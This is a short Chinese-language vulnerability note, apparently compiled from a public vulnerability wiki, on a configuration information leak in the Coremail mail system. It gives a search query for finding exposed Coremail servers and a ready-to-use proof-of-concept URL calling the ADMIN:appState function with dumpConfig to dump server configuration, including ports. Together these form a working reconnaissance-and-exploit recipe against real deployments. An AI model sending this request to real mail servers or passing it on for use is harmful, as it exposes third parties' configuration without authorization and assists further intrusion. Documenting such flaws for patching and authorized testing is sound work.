---
title: "Coremail 配置信息泄露漏洞"
date: 2026-10-16 09:07:21
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Coremail"
tags:
  - "Coremail"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

Coremail 某个接口存在配置信息泄露漏洞，其中存在端口，配置信息等

## 漏洞影响

```
Coremail 配置信息泄露漏洞
```

## 网络测绘

```
app="Coremail邮件系统"
```

## 漏洞复现

POC为

```plain
http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101913188.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Coremail-%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
